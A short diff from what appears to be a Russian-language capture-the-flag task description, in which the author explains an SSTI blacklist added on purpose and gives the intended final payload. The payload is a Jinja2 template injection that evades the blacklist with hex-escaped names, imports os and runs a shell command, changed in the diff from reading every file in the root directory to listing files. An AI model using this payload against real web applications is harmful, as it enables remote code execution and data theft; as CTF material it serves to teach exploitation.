@@ -20,7 +20,7 @@ SSTI:
 
 > Настроил блеклист для ssti, чтоб пейлоад был поинтересней. blacklist = [".","[","]","_","join","init","flag"]
 
-> Конечный пейлоад: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cd / && cat *')|attr('read')()}}
+> Конечный пейлоад: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
 
 
 ### Дополнительные комментарии
